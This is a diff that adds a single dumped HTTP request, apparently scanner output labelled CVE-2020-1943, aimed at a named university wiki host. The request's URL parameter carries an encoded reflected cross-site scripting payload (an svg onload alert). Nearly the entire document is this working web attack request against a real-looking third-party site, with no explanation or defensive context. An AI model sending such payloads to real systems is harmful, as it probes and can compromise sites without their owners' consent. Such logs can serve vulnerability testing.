@@ -1,0 +1,12 @@
+[CVE-2020-1943] Dumped HTTP request for https://agoswiki.earthsci.unimelb.edu.au/control/stream?contentId=%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
+
+
+GET /control/stream?contentId=%27\%22%3E%3Csvg/onload=alert(/xss/)%3E HTTP/1.1
+Host: agoswiki.earthsci.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
